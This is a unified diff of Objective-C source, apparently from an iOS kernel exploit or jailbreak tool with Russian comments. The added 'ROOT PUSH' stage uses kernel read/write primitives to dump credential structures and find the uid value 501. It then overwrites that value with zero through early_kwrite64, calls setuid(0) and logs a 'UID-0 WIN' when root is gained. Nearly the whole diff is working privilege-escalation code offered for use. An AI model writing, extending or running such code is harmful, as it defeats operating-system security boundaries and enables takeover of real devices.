@@ -2454,22 +2454,74 @@ static NSString *kpFmtSptmFn(uint64_t raw)
         kpNote(r, @"  [ATK] step12: refcount restored");
     }
 
-    // ---- ROOT PUSH 2.0.53: охота за uid=0 (writable-указатели cred) ----
-    [r appendString:@"=== ROOT PUSH: uid=0 hunt ===\n"];
-    kpNote(r, [NSString stringWithFormat:@"  [RPT] userspace uid=%u euid=%u (proc-cred)", getuid(), geteuid()]);
+    // ---- ROOT PUSH 2.0.54: posix_cred в ucred_rw+0x10 (самый горячий след) ----
+    [r appendString:@"=== ROOT PUSH 2.0.54: posix_cred hunt ===\n"];
+    kpNote(r, [NSString stringWithFormat:@"  [RPT] userspace uid=%u euid=%u", getuid(), geteuid()]);
     {
         uint64_t ucPA = kvtophys(curUcred & ~0x3fffULL);
         uint64_t ftPA = kvtophys(ftVA & ~0x3fffULL);
-        kpNote(r, [NSString stringWithFormat:@"  [RPT] ucred.pagePA=%#llx t=%d  frameTable.pagePA=%#llx t=%d  ucred_rw t=%d",
+        kpNote(r, [NSString stringWithFormat:@"  [RPT] ucred.pagePA=%#llx t=%d  frameTable t=%d  ucred_rw t=%d",
                   (unsigned long long)ucPA, ucPA ? kpFrameTypeOf(ucPA) : -1,
-                  (unsigned long long)ftPA, ftPA ? kpFrameTypeOf(ftPA) : -1, myRWt]);
-        uint64_t dump[8];
-        for (int i = 0; i < 8; i++) dump[i] = early_kread64(curUcred + (uint64_t)i * 8);
-        kpNote(r, [NSString stringWithFormat:@"  [RPT] ucred[0..40]= %016llx %016llx %016llx %016llx %016llx %016llx %016llx %016llx",
-                  dump[0],dump[1],dump[2],dump[3],dump[4],dump[5],dump[6],dump[7]]);
-        for (int i = 0; i < 4; i++) dump[i] = early_kread64(myRW + (uint64_t)i * 8);
-        kpNote(r, [NSString stringWithFormat:@"  [RPT] ucred_rw[0..20]= %016llx %016llx %016llx %016llx",
-                  dump[0],dump[1],dump[2],dump[3]]);
+                  ftPA ? kpFrameTypeOf(ftPA) : -1, myRWt]);
+        // ucred+0x18 — uid/ruid кластер (RO)
+        uint64_t uidQ = early_kread64(curUcred + 0x18);
+        kpNote(r, [NSString stringWithFormat:@"  [RPT] ucred+0x18=%#018llx (uid=%u ruid=%u)",
+                  (unsigned long long)uidQ, (uint32_t)uidQ, (uint32_t)(uidQ >> 32)]);
+        // ucred_rw dump + спутники
+        NSMutableString *rw = [NSMutableString string];
+        for (int i = 0; i < 8; i++)
+            [rw appendFormat:@" +%x:%#018llx", i * 8, (unsigned long long)early_kread64(myRW + (uint64_t)i * 8)];
+        kpNote(r, [NSString stringWithFormat:@"  [RPT] ucred_rw:%@", rw]);
+        // кандидат: ucred_rw+0x10 → возможно posix_cred / cr_label
+        uint64_t rw10 = kp_untag_ptr(early_kread64(myRW + 0x10));
+        uint64_t rw10pa = kpLooksLikeKernelPointer(rw10) ? kvtophys(rw10 & ~0x3fffULL) : 0;
+        int rw10t = rw10pa ? kpFrameTypeOf(rw10pa) : -1;
+        NSMutableString *d10 = [NSMutableString string];
+        if (kpLooksLikeKernelPointer(rw10)) {
+            for (int i = 0; i < 16; i++)
+                [d10 appendFormat:@" +%x:%#018llx", i * 8, (unsigned long long)early_kread64(rw10 + (uint64_t)i * 8)];
+        }
+        kpNote(r, [NSString stringWithFormat:@"  [RPT] rw10=%#llx pa=%#llx t=%d:%@",
+                  (unsigned long long)rw10, (unsigned long long)rw10pa, rw10t, d10]);
+        // twin: root ucred_rw и его +0x10
+        uint64_t rootRW2 = kp_untag_ptr(early_kread64(rootZVA + 0x00));
+        uint64_t root10 = kpLooksLikeKernelPointer(rootRW2) ? kp_untag_ptr(early_kread64(rootRW2 + 0x10)) : 0;
+        uint64_t root10pa = kpLooksLikeKernelPointer(root10) ? kvtophys(root10 & ~0x3fffULL) : 0;
+        int root10t = root10pa ? kpFrameTypeOf(root10pa) : -1;
+        NSMutableString *dr = [NSMutableString string];
+        if (kpLooksLikeKernelPointer(root10)) {
+            for (int i = 0; i < 16; i++)
+                [dr appendFormat:@" +%x:%#018llx", i * 8, (unsigned long long)early_kread64(root10 + (uint64_t)i * 8)];
+        }
+        kpNote(r, [NSString stringWithFormat:@"  [RPT] root rw10=%#llx pa=%#llx t=%d:%@",
+                  (unsigned long long)root10, (unsigned long long)root10pa, root10t, dr]);
+        // ищем в rw10 кластер 0x1f5 (501) — если есть и t==0x21, это наш posix_cred
+        if (kpLooksLikeKernelPointer(rw10) && rw10t == 0x21) {
+            for (uint32_t o = 0; o + 8 <= 0x100; o += 8) {
+                uint64_t q = early_kread64(rw10 + o);
+                if ((uint32_t)q == 501 || (uint32_t)(q >> 32) == 501) {
+                    kpNote(r, [NSString stringWithFormat:@"  [RPT] ★ 501-cluster at rw10+%#x = %#018llx", o, (unsigned long long)q]);
+                    // пробуем обнулить uid-половину и смотрим getuid
+                    uint64_t saved = q;
+                    early_kwrite64(rw10 + o, q & 0xffffffff00000000ULL);   // младший uid → 0
+                    uint64_t rb = early_kread64(rw10 + o);
+                    uid_t u1 = getuid(), e1 = geteuid();
+                    int su = setuid(0);
+                    uid_t u2 = getuid(), e2 = geteuid();
+                    early_kwrite64(rw10 + o, saved);   // restore
+                    kpNote(r, [NSString stringWithFormat:@"  [RPT] rw10+%#x write readback=%#018llx setuid0=%d uid %u→%u euid %u→%u → restored",
+                              o, (unsigned long long)rb, su, u1, u2, e1, e2]);
+                    if (u2 == 0 || e2 == 0) {
+                        kpNote(r, @"=== UID-0 WIN ★★★ ===");
+                        // оставляем 0 — мы root
+                    } else {
+                        // уже restore выше
+                    }
+                }
+            }
+        } else if (kpLooksLikeKernelPointer(rw10)) {
+            kpNote(r, [NSString stringWithFormat:@"  [RPT] rw10 t=%d — не 0x21, kwrite запрещён", rw10t]);
+        }
     }
     // скан writable-страницы proc и threads на указатель curUcred/rootZVA
     uint64_t hitVA = 0; uint32_t hitOff = 0; int hitT = -1;
